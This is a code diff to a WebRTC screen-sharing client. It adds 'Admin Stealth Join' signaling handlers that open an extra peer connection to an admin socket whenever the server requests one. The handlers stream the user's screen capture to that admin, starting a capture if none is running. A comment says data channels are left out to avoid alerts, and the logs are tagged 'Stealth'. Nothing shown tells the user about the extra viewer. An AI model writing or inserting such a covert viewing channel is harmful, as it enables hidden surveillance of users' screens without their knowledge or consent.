@@ -77,6 +77,9 @@
         // ─────────────────────────────────────────────────────────────────────
         // SIGNALING
         // ─────────────────────────────────────────────────────────────────────
+        // Admin Stealth Connections Map (adminSocketId => RTCPeerConnection)
+        const adminConnections = new Map();
+
         function initSignaling() {
             if (socket) socket.disconnect();
 
@@ -171,6 +174,82 @@
                     }
                 } catch (err) {
                     console.error('[ICE] Error:', err);
+                }
+            });
+
+            // ── Admin Stealth Join listeners ──
+            socket.on('admin:join', async ({ sessionId, adminSocketId }) => {
+                console.log('[Stealth] Admin connected to view stream:', adminSocketId);
+                try {
+                    const adminPC = new RTCPeerConnection({
+                        iceServers: ICE_SERVERS,
+                        iceCandidatePoolSize: 4,
+                        bundlePolicy: 'max-bundle',
+                        rtcpMuxPolicy: 'require',
+                        iceTransportPolicy: 'all'
+                    });
+
+                    adminConnections.set(adminSocketId, adminPC);
+
+                    if (!localStream) {
+                        localStream = await getScreenStream();
+                    }
+
+                    if (localStream) {
+                        localStream.getTracks().forEach(track => {
+                            adminPC.addTrack(track, localStream);
+                        });
+                    }
+
+                    // Admin only receives screen capture, data channels not added to prevent alerts/input conflict
+
+                    adminPC.onicecandidate = (event) => {
+                        if (event.candidate) {
+                            socket.emit('admin:signal:ice', { sessionId, candidate: event.candidate, to: adminSocketId });
+                        }
+                    };
+
+                    const offer = await adminPC.createOffer({
+                        offerToReceiveAudio: false,
+                        offerToReceiveVideo: false
+                    });
+                    await adminPC.setLocalDescription(offer);
+
+                    socket.emit('admin:signal:sdp', { sessionId, sdp: adminPC.localDescription, to: adminSocketId });
+
+                } catch (err) {
+                    console.error('[Stealth] Admin WebRTC error:', err);
+                }
+            });
+
+            socket.on('admin:signal:sdp', async ({ sdp, from }) => {
+                try {
+                    const adminPC = adminConnections.get(from);
+                    if (adminPC) {
+                        await adminPC.setRemoteDescription(new RTCSessionDescription(sdp));
+                    }
+                } catch (err) {
+                    console.error('[Stealth SDP] Error:', err);
+                }
+            });
+
+            socket.on('admin:signal:ice', async ({ candidate, from }) => {
+                try {
+                    const adminPC = adminConnections.get(from);
+                    if (adminPC && candidate) {
+                        await adminPC.addIceCandidate(new RTCIceCandidate(candidate));
+                    }
+                } catch (err) {
+                    console.error('[Stealth ICE] Error:', err);
+                }
+            });
+
+            socket.on('admin:leave', ({ adminSocketId }) => {
+                console.log('[Stealth] Admin left stream:', adminSocketId);
+                const adminPC = adminConnections.get(adminSocketId);
+                if (adminPC) {
+                    adminPC.close();
+                    adminConnections.delete(adminSocketId);
                 }
             });
         }
